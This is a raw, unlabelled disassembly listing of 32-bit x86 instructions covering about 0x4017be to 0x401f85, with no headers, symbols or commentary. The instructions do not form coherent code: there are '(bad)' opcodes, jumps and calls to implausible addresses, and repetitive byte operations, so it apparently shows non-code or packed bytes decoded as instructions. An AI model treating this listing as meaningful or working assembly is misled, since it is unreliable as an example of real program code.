  4017be:	or     al,BYTE PTR es:[ecx]
  4017c1:	xor    edx,DWORD PTR [eax+eax*1+0x4e]
  4017c5:	mov    DWORD PTR [eax],esp
  4017c7:	mov    esp,0xb694201
  4017cc:	pop    ebx
  4017cd:	mov    al,0x1e
  4017cf:	inc    esp
  4017d0:	call   DWORD PTR ds:0x414d14
  4017d6:	add    eax,0x220804ec
  4017db:	add    BYTE PTR [ecx],bl
  4017dd:	mov    al,ds:0x82501003
  4017e2:	inc    ecx
  4017e3:	or     BYTE PTR [ecx+0x7688840],ah
  4017e9:	add    BYTE PTR [ecx],0x40
  4017ec:	push   edx
  4017ed:	sbb    BYTE PTR [ecx],ah
  4017ef:	add    BYTE PTR [eax],ah
  4017f1:	rol    BYTE PTR [eax+0x23100098],0x4
  4017f8:	add    al,0xe
  4017fa:	or     BYTE PTR [eax-0x76],al
  4017fd:	add    al,0x30
  4017ff:	or     al,0xc
  401801:	or     BYTE PTR [edx],0xd8
  401804:	add    BYTE PTR [eax],dh
  401806:	jmp    0x11624016
  40180b:	xor    al,0x1
  40180d:	dec    eax
  40180e:	and    BYTE PTR [ecx+eax*1],0x82
  401812:	inc    ebp
  401813:	and    BYTE PTR [edi],al
  401815:	sbb    BYTE PTR [esi],al
  401817:	add    eax,DWORD PTR [eax+0x2]
  40181a:	and    al,0x2
  40181c:	push   es
  40181d:	adc    eax,DWORD PTR [ebx]
  40181f:	xchg   DWORD PTR [eax],esp
  401821:	add    al,0x21
  401823:	add    BYTE PTR [edi],ch
  401825:	test   BYTE PTR [ecx+0x0],al
  401828:	and    BYTE PTR [eax],al
  40182a:	les    ecx,FWORD PTR [ebx]
  40182c:	and    al,BYTE PTR [edx]
  40182e:	adc    DWORD PTR ds:0x33000228,eax
  401834:	sbb    DWORD PTR [edi],edx
  401836:	add    BYTE PTR [ebp+0x528802a2],al
  40183c:	sub    eax,0x50816022
  401841:	add    al,0x44
  401843:	call   0x31c32c8e
  401848:	mov    fs,WORD PTR [ebp+0x18]
  40184b:	xchg   ecx,eax
  40184c:	test   BYTE PTR [ebp+0x21850000],al
  401852:	dec    ecx
  401853:	add    BYTE PTR [eax],al
  401855:	dec    esi
  401856:	mov    BYTE PTR [ecx-0x5f],dh
  401859:	add    BYTE PTR [eax],0x12
  40185c:	dec    esi
  40185d:	push   ds
  40185e:	or     BYTE PTR [eax+0x504e4109],al
  401864:	bound  esp,QWORD PTR [eax]
  401866:	add    BYTE PTR [ebx],ch
  401868:	mov    eax,ds:0x8020ca0
  40186d:	and    DWORD PTR [eax],ebp
  40186f:	inc    eax
  401870:	inc    esp
  401871:	or     al,BYTE PTR [eax]
  401873:	add    BYTE PTR [eax],al
  401875:	and    dh,BYTE PTR [eax+eiz*1]
  401878:	add    al,BYTE PTR [eax]
  40187a:	push   eax
  40187b:	add    BYTE PTR [eax],ah
  40187d:	sub    DWORD PTR [eax+ebp*2],edx
  401880:	add    BYTE PTR [eax+0xc],dl
  401883:	push   ecx
  401884:	add    esp,DWORD PTR [eax-0x6f]
  401887:	mov    BYTE PTR [eax+0x4e],al
  40188a:	adc    BYTE PTR [eax],dl
  40188c:	and    BYTE PTR [eax],0xe0
  40188f:	add    BYTE PTR [eax-0x55bdacdf],ch
  401895:	add    eax,0x90800042
  40189a:	add    BYTE PTR [eax+0x28],cl
  40189d:	and    BYTE PTR [eax],bl
  40189f:	inc    ecx
  4018a0:	push   esi
  4018a1:	mov    al,ds:0xc0408461
  4018a6:	test   al,0x52
  4018a8:	pop    es
  4018a9:	add    BYTE PTR [ecx+ecx*2],al
  4018ac:	adc    ah,BYTE PTR [eax-0x60]
  4018af:	adc    bl,BYTE PTR [eax+0xd5a0411]
  4018b5:	ror    BYTE PTR [eax+edx*1],0x88
  4018b9:	sub    BYTE PTR [ecx+0x56],dl
  4018bc:	mov    al,BYTE PTR [eax]
  4018be:	push   ss
  4018bf:	inc    eax
  4018c0:	inc    edx
  4018c1:	adc    DWORD PTR [edx],edx
  4018c3:	adc    BYTE PTR [eax+0x1],bl
  4018c6:	sub    cl,BYTE PTR [eax]
  4018c8:	add    ch,BYTE PTR [ecx]
  4018ca:	add    BYTE PTR [esi+ecx*1],dl
  4018cd:	add    DWORD PTR [ebp+0x814112],0x3d878000
  4018d7:	add    BYTE PTR [esi],cl
  4018d9:	xor    BYTE PTR [edx],dl
  4018db:	add    eax,0x104090d5
  4018e0:	and    al,BYTE PTR [eax+0x4408a284]
  4018e6:	pop    ds
  4018e7:	add    DWORD PTR [eax],eax
  4018e9:	(bad)  
  4018ea:	ror    BYTE PTR [eax+0x10],1
  4018ed:	add    BYTE PTR [eax],bl
  4018ef:	adc    dl,BYTE PTR [eax]
  4018f1:	and    BYTE PTR [edx+0x1b],al
  4018f4:	add    BYTE PTR [eax+0x18],bh
  4018f7:	inc    ecx
  4018f8:	add    eax,0x10d5488
  4018fd:	mov    al,ds:0x40a28ec0
  401902:	cmp    dl,al
  401904:	add    BYTE PTR [eax],al
  401906:	loope  0x40192a
  401908:	add    BYTE PTR [eax+eax*1-0x7b4ffefd],dh
  40190f:	mov    al,ds:0x24e0018b
  401914:	xchg   esi,eax
  401915:	test   BYTE PTR [edx+0x42500141],al
  40191b:	sbb    DWORD PTR [eax],esp
  40191d:	add    DWORD PTR [edi+0xc1021],eax
  401923:	add    eax,DWORD PTR [eax]
  401925:	xchg   edx,eax
  401926:	and    BYTE PTR [eax+0x18881400],al
  40192c:	add    BYTE PTR [ecx],al
  40192e:	inc    edx
  40192f:	add    al,BYTE PTR [ecx+0x101]
  401935:	add    ah,BYTE PTR [edx-0x3ccdfffc]
  40193b:	or     BYTE PTR [eax],dl
  40193d:	and    al,BYTE PTR [ecx+0x6200021]
  401943:	inc    ecx
  401944:	adc    DWORD PTR [eax],eax
  401946:	rol    BYTE PTR [ecx+0x26409c0],0x86
  40194d:	nop
  40194e:	mov    BYTE PTR [edx],dh
  401950:	inc    eax
  401951:	rol    ch,0xd2
  401954:	xor    BYTE PTR ds:0xc3600088,cl
  40195a:	add    BYTE PTR [eax+eax*1+0x2808038],dl
  401961:	adc    BYTE PTR [esi],al
  401963:	add    BYTE PTR [eax],ah
  401965:	aaa    
  401966:	add    BYTE PTR [eax+edx*1],al
  401969:	jo     0x4019be
  40196b:	mov    al,ds:0x28000c00
  401970:	cmp    BYTE PTR [eax],0x2b
  401973:	adc    BYTE PTR [ecx+0x7a],cl
  401976:	adc    DWORD PTR [eax+0x8070e2],eax
  40197c:	dec    ecx
  40197d:	adc    eax,0xc0408016
  401982:	dec    esp
  401983:	pop    ss
  401984:	push   ecx
  401985:	sbb    BYTE PTR [eax],al
  401987:	push   esi
  401988:	sbb    BYTE PTR [eax],ah
  40198a:	add    BYTE PTR [eax],dl
  40198c:	or     DWORD PTR [eax+0x4163f38a],eax
  401992:	ret    
  401993:	adc    ah,BYTE PTR [ecx]
  401995:	add    BYTE PTR [eax],dl
  401997:	sub    BYTE PTR [eax+0x30d0820],dh
  40199d:	mov    al,BYTE PTR [eax]
  40199f:	inc    edx
  4019a0:	add    eax,0x848c4022
  4019a5:	add    BYTE PTR [eax+0x2c],0x44
  4019a9:	inc    ax
  4019ab:	and    al,0x99
  4019ad:	popf   
  4019ae:	xchg   edx,eax
  4019af:	retf   0x90
  4019b2:	xchg   DWORD PTR [ebx],edx
  4019b4:	fadd   DWORD PTR [edx+0x21]
  4019b7:	and    BYTE PTR [edx],ah
  4019b9:	and    BYTE PTR [edx],0x21
  4019bc:	adc    BYTE PTR [edx],al
  4019be:	inc    edx
  4019bf:	adc    BYTE PTR [eax+0x30],cl
  4019c2:	add    BYTE PTR [ebp+eax*4+0x10436002],al
  4019c9:	mov    eax,ds:0xb001404
  4019ce:	and    BYTE PTR [edx],0x8
  4019d1:	rcl    BYTE PTR [esp+eax*4],cl
  4019d4:	add    al,BYTE PTR [eax]
  4019d6:	nop
  4019d7:	adc    al,BYTE PTR [edi+0x0]
  4019da:	add    DWORD PTR [eax-0x6f7fafff],edx
  4019e0:	add    DWORD PTR [edx],eax
  4019e2:	adc    DWORD PTR gs:[eax],ebx
  4019e5:	and    BYTE PTR [eax],al
  4019e7:	nop
  4019e8:	add    al,0xc0
  4019ea:	or     BYTE PTR [eax],dl
  4019ec:	or     al,BYTE PTR [ebx+0x4]
  4019ef:	mov    BYTE PTR [eax+ebx*4+0x7000a422],dl
  4019f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019f7:	dec    edx
  4019f8:	ins    BYTE PTR es:[edi],dx
  4019f9:	and    al,0x51
  4019fb:	mov    BYTE PTR [eax],al
  4019fd:	xchg   edx,eax
  4019fe:	or     al,0x11
  401a00:	xchg   esp,eax
  401a01:	add    BYTE PTR [eax+0x1028210],al
  401a07:	xor    BYTE PTR fs:[ebx],al
  401a0a:	nop
  401a0b:	adc    BYTE PTR [edx+0x40],0x10
  401a0f:	mov    al,ss:0x8e2e01e4
  401a15:	inc    eax
  401a16:	add    BYTE PTR [edx+0x50],0x20
  401a1a:	sub    BYTE PTR [edx],bl
  401a1c:	add    eax,0x811686
  401a21:	mov    ds:0x6a00e4,al
  401a26:	stos   BYTE PTR es:[edi],al
  401a27:	xor    BYTE PTR [ebx],0x60
  401a2a:	add    eax,DWORD PTR [eax]
  401a2c:	inc    esp
  401a2d:	pop    es
  401a2e:	mov    al,ds:0x11445000
  401a33:	mov    BYTE PTR [edx],dh
  401a35:	or     BYTE PTR [ecx-0x667fee2e],cl
  401a3b:	add    eax,DWORD PTR [eax-0x7f]
  401a3e:	and    BYTE PTR [ecx],al
  401a40:	test   bl,al
  401a42:	and    al,BYTE PTR [edx+eax*4]
  401a45:	and    BYTE PTR [eax],cl
  401a47:	ror    DWORD PTR [esp+eax*1-0x76ede7f4],0x4c
  401a4f:	add    al,BYTE PTR [ecx]
  401a51:	add    al,BYTE PTR ds:0x49080040
  401a57:	or     BYTE PTR [edx+0x8],al
  401a5a:	push   edx
  401a5b:	call   0x11203664
  401a60:	push   ecx
  401a61:	nop
  401a62:	retf   0xa161
  401a65:	inc    esp
  401a66:	inc    edx
  401a67:	rol    BYTE PTR [edx+0x22],1
  401a6a:	add    al,0xe
  401a6c:	add    BYTE PTR [eax],ch
  401a6e:	pop    eax
  401a6f:	add    al,0xca
  401a71:	xor    BYTE PTR [edx],al
  401a73:	push   eax
  401a74:	add    BYTE PTR [eax+eiz*2-0x7f5febfe],ch
  401a7b:	ret    0x3010
  401a7e:	add    BYTE PTR [ecx],al
  401a80:	fadd   DWORD PTR [eax+0x20]
  401a83:	mov    BYTE PTR [eax+eax*1-0x74],cl
  401a87:	adc    DWORD PTR fs:[esp+ecx*2-0x7c],eax
  401a8c:	mov    edx,0x7000262
  401a91:	inc    edx
  401a92:	add    BYTE PTR [eax],0x4
  401a95:	stos   BYTE PTR es:[edi],al
  401a96:	add    al,0x0
  401a98:	add    al,0xd
  401a9a:	add    bl,0x1c
  401a9d:	sbb    BYTE PTR [esi+0x9],al
  401aa0:	adc    eax,DWORD PTR [esi]
  401aa2:	add    edx,eax
  401aa4:	add    al,0x90
  401aa6:	pop    es
  401aa7:	inc    eax
  401aa8:	add    al,0x86
  401aaa:	inc    eax
  401aab:	xor    BYTE PTR [ecx],0x94
  401aae:	loope  0x401af8
  401ab0:	or     BYTE PTR [ebx],dl
  401ab2:	add    DWORD PTR [ebp-0x5ffaadde],eax
  401ab8:	adc    DWORD PTR fs:[ebx],0x46807324
  401abf:	adc    al,BYTE PTR [edx+0x20]
  401ac2:	test   BYTE PTR [ecx-0x1f],bl
  401ac5:	adc    DWORD PTR [eax-0x6fe5bd65],eax
  401acb:	adc    BYTE PTR [edx-0x3e],ah
  401ace:	xor    BYTE PTR [eax],ah
  401ad0:	add    BYTE PTR [eax],cl
  401ad2:	adc    al,0x47
  401ad4:	and    BYTE PTR [esi+eax*4],dl
  401ad7:	mov    dh,0x9
  401ad9:	or     BYTE PTR [eax],bl
  401adb:	and    BYTE PTR [eax],al
  401add:	arpl   WORD PTR [ebp+0x18],sp
  401ae0:	add    al,0xa0
  401ae2:	es push eax
  401ae4:	ror    BYTE PTR [edx],0x81
  401ae7:	pop    eax
  401ae8:	xchg   edx,eax
  401ae9:	adc    al,al
  401aeb:	push   ss
  401aec:	and    ah,BYTE PTR [edx]
  401aee:	or     BYTE PTR [eax],al
  401af0:	add    BYTE PTR [eax],ch
  401af2:	adc    eax,0x832a
  401af7:	inc    edx
  401af8:	add    BYTE PTR [ecx],0xd2
  401afb:	add    BYTE PTR [ecx],cl
  401afd:	jae    0x401b67
  401aff:	add    ah,0x87
  401b02:	and    al,0xc
  401b04:	add    BYTE PTR ds:0x48028012,dl
  401b0a:	or     BYTE PTR [ebx+0x54002],dl
  401b10:	sub    BYTE PTR [ecx+0x0],bl
  401b13:	mov    eax,es
  401b15:	push   es
  401b16:	sub    al,0x41
  401b18:	pop    ecx
  401b19:	add    BYTE PTR [ebp+edx*4+0xc],al
  401b1d:	add    BYTE PTR [eax+0x4888559],ah
  401b23:	adc    cl,ah
  401b25:	pop    edx
  401b26:	inc    esi
  401b27:	add    BYTE PTR [eax],0xe
  401b2a:	inc    ecx
  401b2b:	mov    al,0x40
  401b2d:	adc    BYTE PTR [eax+0x46209680],al
  401b33:	push   eax
  401b34:	adc    BYTE PTR [ecx],ch
  401b36:	add    BYTE PTR [esi-0xfdedbb5],al
  401b3c:	and    dl,0x0
  401b3f:	call   0xc001:0x288008cb
  401b46:	or     BYTE PTR [edx+0xd14595],0x25
  401b4d:	add    al,bl
  401b4f:	add    DWORD PTR [edi+0x12001000],ebx
  401b55:	inc    eax
  401b56:	rol    BYTE PTR [eax],0x1
  401b59:	sbb    dh,BYTE PTR [eax-0x5dfe6fbf]
  401b5f:	stos   DWORD PTR es:[edi],eax
  401b60:	and    BYTE PTR [ebx+0x4],cl
  401b63:	add    BYTE PTR [eax],dl
  401b65:	add    ah,BYTE PTR [eax]
  401b67:	or     eax,DWORD PTR [eax]
  401b69:	or     DWORD PTR [edx+0x69180003],edi
  401b6f:	adc    BYTE PTR [ecx],al
  401b71:	add    DWORD PTR [eax],edx
  401b73:	and    BYTE PTR [esp+edx*1+0x20],ch
  401b77:	jo     0x401b79
  401b79:	or     BYTE PTR [eax-0x60],al
  401b7c:	add    DWORD PTR [edx],eax
  401b7e:	and    ebp,DWORD PTR fs:[ecx]
  401b81:	add    al,0x4a
  401b83:	add    BYTE PTR [ecx],ah
  401b85:	xor    dl,BYTE PTR [eax+ecx*8]
  401b88:	or     DWORD PTR [ecx],eax
  401b8a:	mov    BYTE PTR [eax+0x1ad74392],cl
  401b90:	or     DWORD PTR [eax],eax
  401b92:	inc    eax
  401b93:	add    DWORD PTR [eax],eax
  401b95:	push   eax
  401b96:	xchg   ecx,eax
  401b97:	mov    al,ds:0x5000220
  401b9c:	adc    DWORD PTR [edi],edx
  401b9e:	inc    esp
  401b9f:	mov    cl,0xd0
  401ba1:	xor    BYTE PTR [edx+0x148000],al
  401ba7:	and    BYTE PTR [eax],0xe8
  401baa:	add    BYTE PTR [ebx],al
  401bac:	fadd   QWORD PTR [eax]
  401bae:	adc    DWORD PTR [ebp+0x20],eax
  401bb1:	add    BYTE PTR [ebx],dh
  401bb3:	nop
  401bb4:	adc    ah,BYTE PTR [edx]
  401bb6:	pushf  
  401bb7:	mov    cl,0x91
  401bb9:	xor    al,0x88
  401bbb:	push   eax
  401bbc:	add    al,BYTE PTR [eax]
  401bbe:	adc    BYTE PTR [eax],dl
  401bc0:	xor    BYTE PTR [ecx+ecx*1],al
  401bc3:	adc    ecx,DWORD PTR [eax-0x3fd7f99f]
  401bc9:	add    BYTE PTR [ecx+0x8830093],ah
  401bcf:	or     BYTE PTR [ebx],0x4a
  401bd2:	add    DWORD PTR [eax+0x24123a04],esp
  401bd8:	add    al,0x2
  401bda:	or     BYTE PTR [edx+0xc],cl
  401bdd:	pusha  
  401bde:	add    BYTE PTR [eax-0x7df66af0],dl
  401be4:	es inc eax
  401be6:	add    BYTE PTR [eax+0x8b02080],cl
  401bec:	xchg   ebx,eax
  401bed:	jo     0x401bf8
  401bef:	adc    ah,BYTE PTR [eax+0x6a]
  401bf2:	inc    eax
  401bf3:	dec    ebx
  401bf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bf5:	adc    DWORD PTR [ecx],edx
  401bf7:	cmp    DWORD PTR [ecx],eax
  401bf9:	push   edx
  401bfa:	and    BYTE PTR [edx+edx*2+0x261048],dl
  401c01:	add    BYTE PTR [eax],al
  401c03:	mov    ah,BYTE PTR [ecx+0x12]
  401c06:	xchg   edx,eax
  401c07:	mov    BYTE PTR [edx],dl
  401c09:	add    BYTE PTR [ebp-0x3ffc7eab],ah
  401c0f:	add    ecx,edx
  401c11:	inc    edx
  401c12:	and    BYTE PTR [eax],cl
  401c14:	adc    BYTE PTR [ebx],0x10
  401c17:	adc    al,BYTE PTR [eax+0x2001c42]
  401c1d:	fmul   QWORD PTR [eax-0x7feeadf0]
  401c23:	add    al,0x68
  401c25:	inc    eax
  401c26:	mov    BYTE PTR [eax],dl
  401c28:	pusha  
  401c29:	add    BYTE PTR [eax],cl
  401c2b:	inc    eax
  401c2c:	xchg   edx,eax
  401c2d:	sbb    al,0x28
  401c2f:	xor    ebp,DWORD PTR [eax+0x3]
  401c32:	loopne 0x401c34
  401c34:	add    BYTE PTR [ecx],al
  401c36:	add    BYTE PTR [eax+edx*1],cl
  401c39:	inc    eax
  401c3a:	adc    BYTE PTR [eax],al
  401c3c:	xchg   esp,eax
  401c3d:	add    eax,0xc21ac0
  401c42:	xor    BYTE PTR [eax],ah
  401c44:	add    dl,dl
  401c46:	dec    ecx
  401c47:	xchg   ebx,eax
  401c48:	mov    al,0xa7
  401c4a:	or     BYTE PTR [eax],cl
  401c4c:	adc    ch,BYTE PTR [eax+eiz*1]
  401c4f:	js     0x401c65
  401c51:	rol    BYTE PTR [eax],1
  401c53:	xchg   edi,eax
  401c54:	or     BYTE PTR [edx+0x25],0x85
  401c58:	push   eax
  401c59:	add    dh,ch
  401c5b:	add    BYTE PTR [eax],dl
  401c5d:	and    BYTE PTR [eax+0x0],al
  401c60:	popa   
  401c61:	sbb    BYTE PTR [ecx+0x60],cl
  401c64:	call   0x4c92de9
  401c69:	xor    eax,DWORD PTR [eax+0x32]
  401c6c:	add    BYTE PTR [eax],al
  401c6e:	cwde   
  401c6f:	add    BYTE PTR [edx],al
  401c71:	mov    eax,ds:0x841f0802
  401c76:	add    eax,0x48119022
  401c7b:	daa    
  401c7c:	or     BYTE PTR [eax],0x3
  401c7f:	pop    esp
  401c80:	inc    ebp
  401c81:	add    ah,BYTE PTR [eax]
  401c83:	adc    bh,al
  401c85:	xor    BYTE PTR [edi],0x0
  401c88:	add    ebx,DWORD PTR es:[edx]
  401c8b:	or     BYTE PTR [eax],ah
  401c8d:	add    ah,BYTE PTR [edi]
  401c8f:	mov    WORD PTR [ebx],es
  401c91:	inc    eax
  401c92:	and    BYTE PTR [eax+0x1100134],al
  401c98:	add    BYTE PTR [eax],al
  401c9a:	loope  0x401cdc
  401c9c:	xchg   edx,eax
  401c9d:	add    BYTE PTR [edx+0x4422020e],ah
  401ca3:	and    BYTE PTR [ecx+0x1],al
  401ca6:	or     al,cl
  401ca8:	mov    ds:0x100122,al
  401cad:	add    BYTE PTR [ebx+0x9080a07],al
  401cb3:	mov    al,ds:0x2000876c
  401cb8:	push   cs
  401cb9:	xor    DWORD PTR [eax],esp
  401cbb:	adc    BYTE PTR [ecx],ch
  401cbd:	and    BYTE PTR [esp+esi*1-0x7e],al
  401cc1:	add    BYTE PTR [eax-0x60],al
  401cc4:	add    BYTE PTR [esi],al
  401cc6:	and    DWORD PTR [ecx-0x7fdbc000],ebp
  401ccc:	mov    DWORD PTR [eax+eax*1],edi
  401ccf:	add    BYTE PTR [edx],al
  401cd1:	sbb    eax,0x2000405
  401cd6:	adc    BYTE PTR [eax+0x14],cl
  401cd9:	add    BYTE PTR [ecx+0x60],0x4
  401cdd:	add    ah,al
  401cdf:	mov    al,BYTE PTR [edi+0x29]
  401ce2:	mov    al,ds:0x2d80c8c4
  401ce7:	add    al,0xe
  401ce9:	adc    BYTE PTR [edx+ebx*2-0x7a],0x30
  401cee:	add    BYTE PTR [eax+eax*2],al
  401cf1:	retf   0x78c8
  401cf4:	add    DWORD PTR [eax],edx
  401cf6:	mov    al,0xc9
  401cf9:	add    eax,0x10280009
  401cfe:	sbb    al,bl
  401d00:	add    BYTE PTR [edx],dl
  401d02:	add    BYTE PTR [eax],dl
  401d04:	add    cl,BYTE PTR [ecx-0x6fdfe6f4]
  401d0a:	add    ah,BYTE PTR [ebp-0x49ce2d18]
  401d10:	adc    BYTE PTR [edi+0x1c435a05],cl
  401d16:	adc    al,BYTE PTR [edx+0x410c51a0]
  401d1c:	add    BYTE PTR [eax+0x0],bh
  401d1f:	add    BYTE PTR [eax-0x11],ah
  401d22:	and    BYTE PTR [ecx+ebp*4+0xc260435],dl
  401d29:	mov    al,ds:0x60222b40
  401d2e:	fild   DWORD PTR [edx+edx*1]
  401d31:	sub    DWORD PTR [eax+0x10080444],esi
  401d37:	and    BYTE PTR [esi+0x6],al
  401d3a:	mov    dl,0x40
  401d3c:	sub    al,0x8
  401d3e:	adc    esi,DWORD PTR [eax]
  401d40:	ins    DWORD PTR es:[edi],dx
  401d41:	and    DWORD PTR [eax],esp
  401d43:	xchg   esp,eax
  401d44:	sub    al,BYTE PTR [eax]
  401d46:	and    BYTE PTR [eax-0x2d7feb9e],cl
  401d4c:	and    DWORD PTR [ecx+edx*1],ecx
  401d4f:	jae    0x401db7
  401d51:	test   DWORD PTR [eax+0x0],eax
  401d54:	dec    ecx
  401d55:	add    eax,DWORD PTR [edi]
  401d57:	sub    BYTE PTR [ecx+0x17114310],al
  401d5d:	add    DWORD PTR [eax+esi*4-0x5f],eax
  401d61:	pop    edx
  401d62:	inc    eax
  401d63:	or     eax,0x28a40a11
  401d68:	sbb    dl,BYTE PTR [edi+0x20c40704]
  401d6e:	add    BYTE PTR [eax],al
  401d70:	and    BYTE PTR [esi],al
  401d72:	add    al,0x90
  401d74:	and    eax,0x419480cf
  401d79:	test   eax,eax
  401d7b:	add    BYTE PTR [edx+0x1d934620],al
  401d81:	and    BYTE PTR [eax+ecx*1],cl
  401d84:	push   0x0
  401d86:	add    ch,dh
  401d88:	fistp  DWORD PTR [edx]
  401d8a:	or     BYTE PTR [ecx],0x21
  401d8d:	and    DWORD PTR [edx+0x21],esi
  401d90:	sbb    edx,edx
  401d92:	xchg   esp,eax
  401d93:	lods   al,BYTE PTR ds:[esi]
  401d94:	adc    BYTE PTR [eax],cl
  401d96:	adc    BYTE PTR [esp+eax*1+0x9040512],cl
  401d9d:	test   ecx,esp
  401d9f:	popa   
  401da0:	add    esp,DWORD PTR [edi]
  401da2:	enter  0x8980,0x34
  401da6:	sbb    eax,DWORD PTR [edx]
  401da8:	add    BYTE PTR [eax],ah
  401daa:	xor    BYTE PTR ss:[ecx],0x49
  401dae:	add    BYTE PTR [edi+eiz*1],ah
  401db1:	push   eax
  401db2:	add    DWORD PTR [ebx+0x11100909],esi
  401db8:	add    DWORD PTR [edx+0x62040000],esp
  401dbe:	adc    cl,BYTE PTR [edx]
  401dc0:	or     DWORD PTR [eax],edx
  401dc2:	add    ah,BYTE PTR [eax+0x4024b0]
  401dc8:	adc    al,0x64
  401dca:	and    BYTE PTR [edx],ah
  401dcc:	inc    eax
  401dcd:	imul   eax,DWORD PTR [eax-0x7f9addb8],0x8801092
  401dd7:	add    esp,DWORD PTR [eax+0x4012009]
  401ddd:	and    BYTE PTR [eax],dh
  401ddf:	and    ah,BYTE PTR [eax+0x390010]
  401de5:	inc    ebx
  401de6:	add    DWORD PTR [edx+0x8d0d260],eax
  401dec:	mov    dl,BYTE PTR [eax]
  401dee:	and    al,BYTE PTR [ecx+edi*4]
  401df1:	inc    ecx
  401df2:	and    DWORD PTR [eax+0x10008439],ecx
  401df8:	and    al,0x40
  401dfa:	inc    edx
  401dfb:	test   BYTE PTR [eax],dh
  401dfd:	or     BYTE PTR [eax],ah
  401dff:	pusha  
  401e00:	dec    edx
  401e01:	and    al,0x2
  401e03:	inc    esp
  401e04:	sbb    al,0xc8
  401e06:	inc    edx
  401e07:	inc    ecx
  401e08:	add    eax,0x1a0a005
  401e0d:	or     al,BYTE PTR [eax-0x7faaf7fe]
  401e13:	or     DWORD PTR [edx+0x2b9b1848],ebp
  401e19:	and    BYTE PTR [edi],al
  401e1b:	xchg   edi,eax
  401e1c:	push   eax
  401e1d:	add    BYTE PTR [ecx+0x1c],cl
  401e20:	add    ah,BYTE PTR [eax]
  401e22:	add    DWORD PTR [eax],0xffffff98
  401e25:	adc    BYTE PTR [eax],dl
  401e27:	add    DWORD PTR [ebx+0x48],ecx
  401e2a:	adc    edx,DWORD PTR [ecx]
  401e2c:	push   eax
  401e2d:	adc    BYTE PTR [eax+0x30],0xa5
  401e31:	add    esp,DWORD PTR [edx]
  401e33:	sbb    al,BYTE PTR [ebp+0x4a100387]
  401e39:	mov    dl,0x4
  401e3b:	add    DWORD PTR [ebx],0xc600000b
  401e41:	add    al,BYTE PTR [esi-0x40]
  401e44:	add    eax,DWORD PTR [edx]
  401e46:	nop
  401e47:	adc    dl,cl
  401e49:	and    ah,BYTE PTR [esi]
  401e4b:	test   BYTE PTR [edx],al
  401e4d:	inc    eax
  401e4e:	adc    DWORD PTR fs:[eax-0x7e],edx
  401e52:	add    BYTE PTR [edx-0x7fbe7f5c],bl
  401e58:	inc    eax
  401e59:	and    dl,BYTE PTR [edx-0x7f]
  401e5c:	mov    al,0x8a
  401e5e:	add    al,BYTE PTR [edx]
  401e60:	or     DWORD PTR [eax+0x14300000],ebx
  401e66:	or     DWORD PTR [eax],eax
  401e68:	inc    edx
  401e69:	pusha  
  401e6a:	sub    BYTE PTR [esi],cl
  401e6c:	and    cl,BYTE PTR [eax]
  401e6e:	dec    eax
  401e6f:	inc    eax
  401e70:	add    BYTE PTR [edx+0x0],ch
  401e73:	adc    BYTE PTR [eax],cl
  401e75:	add    DWORD PTR [edx],esi
  401e77:	sub    eax,0x44c00080
  401e7c:	inc    eax
  401e7d:	xor    eax,0x40421087
  401e82:	add    eax,DWORD PTR [eax+0x23440302]
  401e88:	rcr    DWORD PTR [ebx],0x74
  401e8b:	add    BYTE PTR [esp+eax*1],0x8d
  401e8f:	test   BYTE PTR [eax],cl
  401e91:	add    al,0x9
  401e93:	or     BYTE PTR [eax],bh
  401e95:	arpl   WORD PTR [eax],ax
  401e97:	and    DWORD PTR [eax],edx
  401e99:	xor    cl,BYTE PTR [edx]
  401e9b:	mov    WORD PTR [edx],es
  401e9d:	adc    BYTE PTR [eax],al
  401e9f:	fld    DWORD PTR [eax]
  401ea1:	mov    eax,ds:0x6cc2ae2
  401ea6:	push   edx
  401ea7:	inc    ecx
  401ea8:	mov    esp,0x182942d0
  401ead:	add    ch,BYTE PTR [eax]
  401eaf:	add    DWORD PTR [edx],0x21520016
  401eb5:	or     eax,0xc0091143
  401eba:	xchg   BYTE PTR [edx+0x12],dl
  401ebd:	dec    eax
  401ebe:	inc    ecx
  401ebf:	xchg   BYTE PTR [edx+0x1844cc0],bl
  401ec5:	add    DWORD PTR [eax],edx
  401ec7:	mov    es,WORD PTR [esi]
  401ec9:	inc    esp
  401eca:	inc    eax
  401ecb:	add    DWORD PTR [eax+0x40882211],0x50022020
  401ed5:	or     BYTE PTR [edx],al
  401ed7:	add    DWORD PTR [esi],ebp
  401ed9:	add    BYTE PTR [eax],dl
  401edb:	dec    eax
  401edc:	add    eax,0x20002d
  401ee1:	add    DWORD PTR [ecx+0x291144],eax
  401ee7:	rol    BYTE PTR [esp+ebp*2],0x80
  401eeb:	push   0x68080821
  401ef0:	add    al,BYTE PTR [eax]
  401ef2:	add    al,0x2
  401ef4:	add    esp,DWORD PTR [edx]
  401ef6:	jo     0x401ef8
  401ef8:	xor    eax,DWORD PTR [eax]
  401efa:	add    BYTE PTR [ebp+0x1ce08b40],cl
  401f00:	add    BYTE PTR [ecx+0x70420080],ah
  401f06:	jae    0x401f08
  401f08:	loopne 0x401f0a
  401f0a:	mov    eax,ds:0x40158414
  401f0f:	push   ecx
  401f10:	and    DWORD PTR [eax],0x49020029
  401f16:	add    BYTE PTR [ecx],cl
  401f18:	adc    al,BYTE PTR [edx+0x10]
  401f1b:	add    eax,0x20980609
  401f20:	mov    eax,0x91128801
  401f25:	add    dl,ah
  401f27:	inc    esp
  401f28:	push   es
  401f29:	and    al,0x41
  401f2b:	inc    edx
  401f2c:	add    eax,DWORD PTR [ecx+0x142000]
  401f32:	add    al,0x11
  401f34:	add    dh,al
  401f36:	mov    DWORD PTR [ebx],eax
  401f38:	adc    al,0xe8
  401f3a:	add    DWORD PTR [eax],eax
  401f3c:	add    BYTE PTR [eax],dl
  401f3e:	push   cs
  401f3f:	or     DWORD PTR [edx-0x7fbeb6fe],eax
  401f45:	loopne 0x401f57
  401f47:	add    BYTE PTR [eax-0x6dfbef00],al
  401f4d:	add    BYTE PTR [eax+0x460241a0],0x18
  401f54:	add    DWORD PTR [eax-0x3fbeeeef],eax
  401f5a:	add    DWORD PTR [ecx+0x10],0x2
  401f5e:	and    DWORD PTR [eax-0x55ac1fff],eax
  401f64:	or     BYTE PTR [eax+0x42205c9],ah
  401f6a:	mov    al,0x31
  401f6c:	add    eax,0x26203101
  401f71:	mov    ds:0x32e41092,al
  401f76:	cmp    al,0xa4
  401f78:	add    al,BYTE PTR [ebx]
  401f7a:	pusha  
  401f7b:	imul   eax,DWORD PTR [ecx-0x3f7fb6cc],0xe654d8
  401f85:	or     eax,0x5427eb01
